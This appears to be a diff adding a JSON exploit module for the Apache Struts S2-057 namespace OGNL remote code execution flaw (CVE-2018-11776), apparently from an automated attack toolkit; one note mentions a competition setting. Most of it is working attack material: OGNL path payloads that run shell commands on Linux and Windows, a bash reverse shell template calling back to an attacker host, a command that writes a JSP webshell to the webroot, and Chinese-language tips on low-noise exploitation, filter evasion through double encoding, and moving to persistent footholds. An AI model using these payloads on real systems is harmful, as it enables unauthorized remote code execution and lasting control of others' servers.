@@ -1,0 +1,125 @@
+{
+  "id": "struts-s2-057-cve-2018-11776",
+  "family": "struts",
+  "product": "Apache Struts",
+  "cve": "CVE-2018-11776",
+  "aliases": [
+    "S2-057",
+    "namespace redirect OGNL RCE"
+  ],
+  "severity": "critical",
+  "tags": [
+    "struts",
+    "ognl",
+    "namespace",
+    "action",
+    "rce"
+  ],
+  "applicability": {
+    "versions": [
+      "2.3-2.3.34",
+      "2.5-2.5.16"
+    ],
+    "fingerprints": [
+      "Struts actions resolved from dynamic namespace or wildcard routes",
+      "URLs ending with .action or action chaining behavior",
+      "Applications using Convention plugin or misconfigured namespace resolution"
+    ],
+    "signals": [
+      "Nonexistent namespaces still dispatch into valid actions",
+      "Encoded path segments influence OGNL evaluation or response headers",
+      "The target shows Struts routing behavior without strict namespace definition"
+    ]
+  },
+  "preconditions": [
+    "A Struts action must be reachable through a namespace-derived URL path.",
+    "Namespace configuration must allow attacker-influenced path evaluation.",
+    "The application must not canonicalize the injected path segment before Struts handles it."
+  ],
+  "verification": {
+    "method": "http_get",
+    "requests": [
+      {
+        "path": "/${(#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Struts-Probe','s2-057-ok'))}/index.action",
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0"
+        },
+        "data": "",
+        "matchers": [
+          "Response header X-Struts-Probe: s2-057-ok",
+          "Status code differs from ordinary nonexistent namespace response"
+        ]
+      }
+    ]
+  },
+  "exploitation": {
+    "mode": "rce",
+    "requests": [
+      {
+        "path": "/${(#cmd='id').(#p=new java.lang.ProcessBuilder({'/bin/sh','-c',#cmd})).(#p.redirectErrorStream(true)).(#process=#p.start())}/index.action",
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0"
+        },
+        "data": "",
+        "os_hint": "linux"
+      },
+      {
+        "path": "/${(#cmd='whoami').(#p=new java.lang.ProcessBuilder({'cmd.exe','/c',#cmd})).(#p.redirectErrorStream(true)).(#process=#p.start())}/index.action",
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0"
+        },
+        "data": "",
+        "os_hint": "windows"
+      }
+    ]
+  },
+  "post_exploitation": {
+    "stabilization": [
+      "先确认哪个 action 路由最稳定，再围绕该路由做低频利用。",
+      "尽快记录可用 namespace、action 名、容器路径和运行账户。",
+      "如果命令执行不稳定，优先转向配置泄露、会话复用或更持久的部署型 foothold。"
+    ],
+    "shell_options": [
+      {
+        "type": "bash_reverse_shell",
+        "template": "bash -c 'exec bash -i &>/dev/tcp/{lhost}/{lport} <&1'"
+      },
+      {
+        "type": "jsp_webshell_write",
+        "template": "printf '%s' '<%if(request.getParameter(\"cmd\")!=null){Runtime.getRuntime().exec(request.getParameter(\"cmd\"));}%>' > {writable_webroot}/s2057.jsp"
+      }
+    ]
+  },
+  "stability": {
+    "preferred_order": [
+      "先用自定义 header 做路径注入验证。",
+      "确认路径解析成立后再尝试低噪声命令。",
+      "对成功路由做最小化重复利用，避免在多个 action 之间盲扫。"
+    ],
+    "safe_commands": [
+      "id",
+      "whoami",
+      "pwd",
+      "hostname"
+    ],
+    "shell_prerequisites": [
+      "确认路径中 `${...}` 或其编码变体不会被网关提前过滤。",
+      "确认存在稳定触发的 action 路径，而不是单次异常路径。"
+    ],
+    "fallbacks": [
+      "如果 header 注入失败，尝试 URL 编码、双编码或替换 action 路径。",
+      "如果 namespace 路由不存在，转向 multipart 类 S2-045/S2-046 或其他 Struts OGNL 链。"
+    ]
+  },
+  "detection_notes": [
+    "S2-057 更依赖路由结构，误把普通 Java Web 当 Struts 命中率会很低。",
+    "在比赛场景中，先确认 `.action`、Struts 特征和 namespace 行为再继续。"
+  ],
+  "references": [
+    "Apache Struts S2-057 advisory",
+    "Public S2-057 namespace OGNL exploitation notes"
+  ]
+}
